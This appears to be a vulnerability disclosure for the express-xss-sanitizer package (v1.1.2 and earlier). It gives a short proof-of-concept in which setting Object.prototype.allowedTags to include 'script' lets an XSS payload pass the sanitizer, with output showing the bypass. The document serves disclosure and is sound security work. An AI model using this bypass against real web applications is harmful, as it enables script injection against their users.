| Issue: express-xss-sanitizer doesn't sanitize xss payloads properly, when the client is already affected by prototype pollution.  Affected versions: v1.1.2 and earlier  Code -  ``` //Refer https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ for more information  var expressXssSanitizer = require("express-xss-sanitizer"); var data = "<h1>Hi</h1><script>alert()</script>"; Object.prototype.allowedTags = ['script']; data = expressXssSanitizer.sanitize(data, {}); console.log(data);  ```  Output -  ``` "\n\n‚ö†Ô∏è Your `allowedTags` option includes, `script`, which‚Ä¶ option\nand ensure you are accounting for this risk.\n\n" "Hi<script>alert()</script>"  ```  For Live POC - <https://runkit.com/embed/w306l6zfm7tu> Refer <https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/> for more information. |
